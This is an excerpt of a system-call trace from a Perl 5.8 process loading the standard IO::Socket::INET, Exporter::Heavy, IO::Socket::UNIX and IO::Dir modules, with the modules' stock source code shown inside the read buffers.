5839  07:10:58.169125 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.169149 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
5839  07:10:58.169201 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.169232 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.169244 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.169261 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
5839  07:10:58.169573 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169589 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169602 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169615 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169630 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169635 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169635 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169636 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169636 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169636 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169636 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169637 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169639 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.169654 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
5839  07:10:58.169675 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.169690 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.169701 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.169719 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
5839  07:10:58.170517 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
5839  07:10:58.170714 brk(0x829c000)    = 0x829c000
5839  07:10:58.171080 read(8, "", 4096) = 0
5839  07:10:58.171100 close(8)          = 0
5839  07:10:58.172521 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
5839  07:10:58.172902 _llseek(6, 6496, [6496], SEEK_SET) = 0
5839  07:10:58.172918 _llseek(6, 0, [6496], SEEK_CUR) = 0
5839  07:10:58.172928 close(6)          = 0
5839  07:10:58.173023 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180196 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180278 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180308 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180371 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180422 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180455 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180503 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180534 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180582 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180615 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.180629 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
5839  07:10:58.180705 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.180763 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.180790 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.180807 brk(0x82bd000)    = 0x82bd000
5839  07:10:58.180840 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
5839  07:10:58.182482 _llseek(6, 1386, [1386], SEEK_SET) = 0
5839  07:10:58.200211 _llseek(6, 0, [1386], SEEK_CUR) = 0
5839  07:10:58.200309 close(6)          = 0
5839  07:10:58.200438 stat64("/etc/perl/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200474 stat64("/etc/perl/IO/Dir.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200500 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200523 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200537 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200550 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200563 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200575 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200588 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200601 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200613 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.200626 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
5839  07:10:58.200647 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.200662 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.200674 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.200695 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
